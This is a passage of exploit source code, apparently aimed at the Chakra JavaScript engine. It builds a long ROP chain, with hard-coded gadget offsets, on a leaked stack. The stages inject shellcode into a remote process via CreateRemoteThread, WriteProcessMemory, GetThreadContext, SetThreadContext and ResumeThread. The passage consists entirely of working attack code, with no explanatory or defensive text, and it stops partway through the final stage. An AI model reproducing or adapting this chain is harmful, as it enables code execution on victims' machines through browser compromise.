    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x4947c9, chakraHigh);    // 0x1804947c9: ret  ;  (1 found)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x4947c9, chakraHigh);    // 0x1804947c9: ret  ;  (1 found)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x4947c9, chakraHigh);    // 0x1804947c9: ret  ;  (1 found)
    ropCounter+=8
    //write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x03f420e, chakraHigh);    // 0x1803f420e: int3  ; ret  ;  (1 found) BREAK ENABLE: GET VIRUTUALALLOC EX
    //ropCounter+=8                                                                                              // HERE IS THE ADDRESS THAT WE WILL PUT OUR SHELLCODE AT
                                                                                                               // JIT_ADDRESS + START_OF_ROP_CHAIN: 
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x74b000+storage-0x20, chakraHigh); // VIRTUALALLOCEX HERE
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x313349, chakraHigh);       // 0x180313349: mov qword [rcx], rax ; ret 
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x74b000+storage-0x120, chakraHigh); // VIRTUALALLOCEX HERE
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x313349, chakraHigh);       // 0x180313349: mov qword [rcx], rax ; ret 
    ropCounter+=8
    ////////////////////////////////////////////////////////////////////////////////////
    // STAGE 3: CreateRemoteThread /////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////

    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x61005, chakraHigh);    // 0x180061005: pop rax ; ret  ;  (1 found)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x74b000+storage+0x20, chakraHigh); 
    ropCounter+=8  
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x74b000+storage, chakraHigh); 
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x000d2125, chakraHigh);    // 0x1800d2125:  mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret  ;  (1 found)
    ropCounter+=8  
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x61005, chakraHigh);    // 0x180061005: pop rax ; ret  ;  (1 found)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], crt[0], crt[1]); // WPM 
    ropCounter+=8  
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x272bdc, chakraHigh);  
    // mov rdx, qword [rsp+0x10] ; mov r8, qword [rsp+0x18] ; mov r9, qword [rsp+0x20] ; jmp rax ;  (1 found)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x0045481c, chakraHigh); // +0x0 pivot
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], 0x41414141, 0x41414141); // +0x8 does not matter
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], 0x0, 0x0); // +0x10 (rdx) 
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], 0x0, 0x0); // +0x18 (r8)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], 0x42424242, 0x42424242); // address that thread will return to
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], 0x0, 0x0); 
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], 0x4, 0x0);
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], 0x0, 0x0);
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x4947c9, chakraHigh);    // 0x1804947c9: ret  ;  (1 found)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x4947c9, chakraHigh);    // 0x1804947c9: ret  ;  (1 found)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x4947c9, chakraHigh);    // 0x1804947c9: ret  ;  (1 found)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x4947c9, chakraHigh);    // 0x1804947c9: ret  ;  (1 found)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x4947c9, chakraHigh);    // 0x1804947c9: ret  ;  (1 found)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x74b000+storage-0x40, chakraHigh);  // location of remoteThreadHandle
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x313349, chakraHigh);       // 0x180313349: mov qword [rcx], rax ; ret 
    ropCounter+=8


    ////////////////////////////////////////////////////////////////////////////////////
    // STAGE 4: Update 1 ///////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////

    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], 0xffffffff, 0xffffffff); 
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
    ropCounter+=8   
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x74b000+SHELLCODE_ADDRESS_COUNTER_1, chakraHigh); 
    ropCounter+=8                                                                       
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x61005, chakraHigh);    // 0x180061005: pop rax ; ret  ;  (1 found)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], wpm[0], wpm[1]); // WPM 
    ropCounter+=8  
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x00272be1, chakraHigh); // 0x180272bdc: mov r8, qword [rsp+0x18] ; mov r9, qword [rsp+0x20] ; jmp rax ;  (1 found)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x0045481c, chakraHigh); // +0x0 pivot add     rsp,40h; pop rbx; ret
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], 0x41414141, 0x41414141); // +0x8 does not matter (rcx) ffffffffff
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], 0x41414141, 0x41414141); // +0x10 (rdx) rop chain
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x74b000+storage-0x20, chakraHigh); // +0x18 (r8) what we wannt to copy, aka the virtuallocex
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], 0x8, 0x0); // +0x20 (r9)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], 0x0, 0x0); // rando pointer
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x4947c9, chakraHigh);    // 0x1804947c9: ret  ;  (1 found)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x4947c9, chakraHigh);    // 0x1804947c9: ret  ;  (1 found)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x4947c9, chakraHigh);    // 0x1804947c9: ret  ;  (1 found)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x4947c9, chakraHigh);    // 0x1804947c9: ret  ;  (1 found)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x4947c9, chakraHigh);    // 0x1804947c9: ret  ;  (1 found)
    ropCounter+=8

    ////////////////////////////////////////////////////////////////////////////////////
    // STAGE 5: Update 2 ///////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////

    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], 0xffffffff, 0xffffffff); 
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
    ropCounter+=8   
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x74b000+SHELLCODE_ADDRESS_COUNTER_2, chakraHigh); 
    ropCounter+=8                                                                       
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x61005, chakraHigh);    // 0x180061005: pop rax ; ret  ;  (1 found)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], wpm[0], wpm[1]); // WPM 
    ropCounter+=8  
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x00272be1, chakraHigh); // 0x180272bdc: mov r8, qword [rsp+0x18] ; mov r9, qword [rsp+0x20] ; jmp rax ;  (1 found)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x0045481c, chakraHigh); // +0x0 pivot add     rsp,40h; pop rbx; ret
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], 0x41414141, 0x41414141); // +0x8 does not matter (rcx) ffffffffff
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], 0x41414141, 0x41414141); // +0x10 (rdx) rop chain
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x74b000+storage-0x20, chakraHigh); // +0x18 (r8) what we wannt to copy, aka the virtuallocex
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], 0x8, 0x0); // +0x20 (r9)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], 0x0, 0x0); // rando pointer
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x4947c9, chakraHigh);    // 0x1804947c9: ret  ;  (1 found)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x4947c9, chakraHigh);    // 0x1804947c9: ret  ;  (1 found)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x4947c9, chakraHigh);    // 0x1804947c9: ret  ;  (1 found)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x4947c9, chakraHigh);    // 0x1804947c9: ret  ;  (1 found)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x4947c9, chakraHigh);    // 0x1804947c9: ret  ;  (1 found)
    ropCounter+=8

    ////////////////////////////////////////////////////////////////////////////////////
    // STAGE 7-8: Get Thread Context ///////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////

    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x74b000-0x500+0x30, chakraHigh); // thread handle
    ropCounter+=8  
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], 0x0010001F, 0x00000000);             // CONTEXT_ALL
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x313349, chakraHigh);      // 0x180313349: mov qword [rcx], rax ; ret (Write the address for storage)
    ropCounter+=8

    //write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x03f420e, chakraHigh);    // 0x1803f420e: int3  ; ret  ;  (1 found) // seoncd breakpoint
    //ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x74b000+storage-0x40, chakraHigh); // thread handle
    ropCounter+=8  
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x61005, chakraHigh);    // 0x180061005: pop rax ; ret  ;  (1 found)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x74b000+storage+0x20, chakraHigh); // rando pointer
    ropCounter+=8  
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x000d2125, chakraHigh);    // 0x1800d2125:  mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret  ;  (1 found)
    ropCounter+=8  
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
    ropCounter+=8   
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x74b000-0x500, chakraHigh); // location of thread context object
    ropCounter+=8    
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x61005, chakraHigh);    // 0x180061005: pop rax ; ret  ;  (1 found)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], gtc[0], gtc[1]);  
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x00272beb, chakraHigh);    // 00272beb just jmp rax
    ropCounter+=8    

    ////////////////////////////////////////////////////////////////////////////////////
    // STAGE 8.1: Update Context.RIP ///////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////

    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x61005, chakraHigh);    // 0x180061005: pop rax ; ret  ;  (1 found)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x74b000-0x500+0x0f8, chakraHigh); // location of thread context object
    ropCounter+=8  
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
    ropCounter+=8   
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x28b4fe, chakraHigh);      // ret gadget we want to overwrite our remote thread's RIP with 
    ropCounter+=8   
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0xfeab, chakraHigh);        // 0x18000feab: mov qword [rax], rcx ; ret  (Context.Rip = ret_gadget)
    ropCounter+=8   


    ////////////////////////////////////////////////////////////////////////////////////
    // STAGE 8.2: Update Context.RSP with ROP ////////////////////////////////////////// (jit handle)
    ////////////////////////////////////////////////////////////////////////////////////

    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
    ropCounter+=8   
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x74b000-0x500+0x098-0x8, chakraHigh); 
    ropCounter+=8                                                                      
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x255fa0, chakraHigh);       // mov rdx, qword [rdx+0x08] ; mov rax, rdx ; ret
    ropCounter+=8  
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x74b000+storage, chakraHigh); 
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x61005, chakraHigh);    // 0x180061005: pop rax ; ret  ;  (1 found)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x74b000+storage+0x20, chakraHigh); 
    ropCounter+=8  
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x000d2125, chakraHigh);    // 0x1800d2125:  mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret  ;  (1 found)
    ropCounter+=8  
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x61005, chakraHigh);    // 0x180061005: pop rax ; ret  ;  (1 found)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], wpm[0], wpm[1]); // WPM 
    ropCounter+=8  
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x00272be1, chakraHigh); // 0x180272bdc: mov r8, qword [rsp+0x18] ; mov r9, qword [rsp+0x20] ; jmp rax ;  (1 found)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x0045481c, chakraHigh); // +0x0 pivot
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], 0x41414141, 0x41414141); // +0x8 (rcx)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], 0x41414141, 0x41414141); // +0x10 (rdx) 
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x74b000+START_OF_ROP_CHAIN, chakraHigh); // +0x18 (r8)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], 0x400, 0x0); // +0x20 (r9)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], 0x0, 0x0); // rando pointer
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x4947c9, chakraHigh);    // 0x1804947c9: ret  ;  (1 found)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x4947c9, chakraHigh);    // 0x1804947c9: ret  ;  (1 found)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x4947c9, chakraHigh);    // 0x1804947c9: ret  ;  (1 found)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x4947c9, chakraHigh);    // 0x1804947c9: ret  ;  (1 found)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x4947c9, chakraHigh);    // 0x1804947c9: ret  ;  (1 found)
    ropCounter+=8

    ////////////////////////////////////////////////////////////////////////////////////
    // STAGE 8.3: SetContext /////////////////////////////////////////////////////////// (threadHandle)
    ////////////////////////////////////////////////////////////////////////////////////

    //write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x03f420e, chakraHigh);    // 0x1803f420e: int3  ; ret  ;  (1 found) // seoncd breakpoint
    //ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x74b000+storage-0x40, chakraHigh); 
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x61005, chakraHigh);    // 0x180061005: pop rax ; ret  ;  (1 found)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x74b000+storage+0x20, chakraHigh); // rando pointer
    ropCounter+=8  
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x000d2125, chakraHigh);    // 0x1800d2125:  mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret  ;  (1 found)
    ropCounter+=8  
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
    ropCounter+=8   
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x74b000-0x500, chakraHigh); 
    ropCounter+=8  
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x61005, chakraHigh);    // 0x180061005: pop rax ; ret  ;  (1 found)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], stc[0], stc[1]); // SetThreadContext 
    ropCounter+=8  
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x00272beb, chakraHigh);    // 00272beb just jmp rax
    ropCounter+=8    
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x0045481c, chakraHigh); // +0x0 pivot
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x4947c9, chakraHigh);    // 0x1804947c9: ret  ;  (1 found)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x4947c9, chakraHigh);    // 0x1804947c9: ret  ;  (1 found)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x4947c9, chakraHigh);    // 0x1804947c9: ret  ;  (1 found)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x4947c9, chakraHigh);    // 0x1804947c9: ret  ;  (1 found)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x4947c9, chakraHigh);    // 0x1804947c9: ret  ;  (1 found)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x4947c9, chakraHigh);    // 0x1804947c9: ret  ;  (1 found)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x4947c9, chakraHigh);    // 0x1804947c9: ret  ;  (1 found)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x4947c9, chakraHigh);    // 0x1804947c9: ret  ;  (1 found)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x4947c9, chakraHigh);    // 0x1804947c9: ret  ;  (1 found)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x4947c9, chakraHigh);    // 0x1804947c9: ret  ;  (1 found)
    ropCounter+=8

    ////////////////////////////////////////////////////////////////////////////////////
    // STAGE 9: WPM code /////////////////////////////////////////////////////////////// (jit handle)
    ////////////////////////////////////////////////////////////////////////////////////

    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x0053c8c3, chakraHigh);  // add rsp
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], 0x41414141, 0x41414141); 
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], 0x41414141, 0x41414141); 
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], 0x41414141, 0x41414141); 
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], 0x41414141, 0x41414141); 
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], 0x41414141, 0x41414141); 
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x74b000+storage-0x20, chakraHigh); 
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x313349, chakraHigh);       // 0x180313349: mov qword [rcx], rax ; ret 
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
    ropCounter+=8   
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x74b000+storage-0x120-0x8, chakraHigh); 
    ropCounter+=8                                                                      
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x255fa0, chakraHigh);       // mov rdx, qword [rdx+0x08] ; mov rax, rdx ; ret
    ropCounter+=8  
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x61005, chakraHigh);    // 0x180061005: pop rax ; ret  ;  (1 found)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x74b000+storage+0x20, chakraHigh); 
    ropCounter+=8  
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x74b000+storage, chakraHigh); 
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x000d2125, chakraHigh);    // 0x1800d2125:  mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret  ;  (1 found)
    ropCounter+=8  
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x61005, chakraHigh);    // 0x180061005: pop rax ; ret  ;  (1 found)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], wpm[0], wpm[1]); // WPM 
    ropCounter+=8  
    //write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x03f420e, chakraHigh);    // 0x1803f420e: int3  ; ret  ;  (1 found)
    //ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x00272be1, chakraHigh); // 0x180272bdc: mov r8, qword [rsp+0x18] ; mov r9, qword [rsp+0x20] ; jmp rax ;  (1 found)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x0045481c, chakraHigh); // +0x0 pivot
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], 0x41414141, 0x41414141); // +0x8 does not matter
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], 0x41414141, 0x41414141); // +0x10 (rdx) 
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x74b000, chakraHigh); // +0x18 (r8)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], 0x400, 0x0); // +0x20 (r9)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x74b000+storage+0x20, chakraHigh); // rando pointer
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x4947c9, chakraHigh);    // 0x1804947c9: ret  ;  (1 found)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x4947c9, chakraHigh);    // 0x1804947c9: ret  ;  (1 found)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x4947c9, chakraHigh);    // 0x1804947c9: ret  ;  (1 found)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x4947c9, chakraHigh);    // 0x1804947c9: ret  ;  (1 found)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x4947c9, chakraHigh);    // 0x1804947c9: ret  ;  (1 found)
    ropCounter+=8

    ////////////////////////////////////////////////////////////////////////////////////
    // STAGE 10: Resume Thread /////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////

    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x74b000+storage-0x40, chakraHigh); 
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x61005, chakraHigh);    // 0x180061005: pop rax ; ret  ;  (1 found)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x74b000+storage+0x20, chakraHigh); // rando pointer
    ropCounter+=8  
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x000d2125, chakraHigh);    // 0x1800d2125:  mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret  ;  (1 found)
    ropCounter+=8  
